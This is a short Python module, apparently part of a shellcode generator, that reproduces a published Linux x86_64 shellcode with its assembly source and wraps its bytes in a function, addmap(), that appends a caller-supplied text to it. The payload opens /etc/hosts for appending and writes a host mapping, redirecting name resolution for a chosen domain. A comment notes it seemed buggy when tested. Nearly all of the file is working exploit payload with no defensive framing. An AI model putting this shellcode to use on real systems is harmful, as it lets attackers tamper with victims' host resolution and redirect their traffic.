#http://shell-storm.org/shellcode/files/shellcode-896.php


#; Title: Add map in /etc/hosts file - 110 bytes
#; Date: 2014-10-29
#; Platform: linux/x86_64
#; Website: http://osandamalith.wordpress.com
#; Author: Osanda Malith Jayathissa (@OsandaMalith)

"""
global _start
    section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    add rax, 1 ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add rax, 3
    syscall

    ;exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
*/

"""
#Tested on ubuntu 15.04 seems like buggy .. 


def addmap( command):
    shellcode =  r"\x48\x31\xc0\x48\x83\xc0\x02\x48"
    shellcode += r"\x31\xff\x48\x31\xf6\x56\x49\xb8"
    shellcode += r"\x2f\x65\x74\x63\x2f\x2f\x2f\x2f"
    shellcode += r"\x49\xba\x2f\x2f\x2f\x68\x6f\x73"
    shellcode += r"\x74\x73\x41\x52\x41\x50\x48\x01"
    shellcode += r"\xe7\x48\x31\xf6\x66\x81\xc6\x01"
    shellcode += r"\x04\x0f\x05\x48\x97\x48\x31\xc0"
    shellcode += r"\x48\x83\xc0\x01\xeb\x18\x5e\xb2"
    shellcode += r"\x13\x0f\x05\x48\x31\xc0\x48\x83"
    shellcode += r"\xc0\x03\x0f\x05\x48\x31\xc0\xb0"
    shellcode += r"\x3c\x48\x31\xff\x0f\x05\xe8\xe3"
    shellcode += r"\xff\xff\xff"
    shellcode += command
    return shellcode






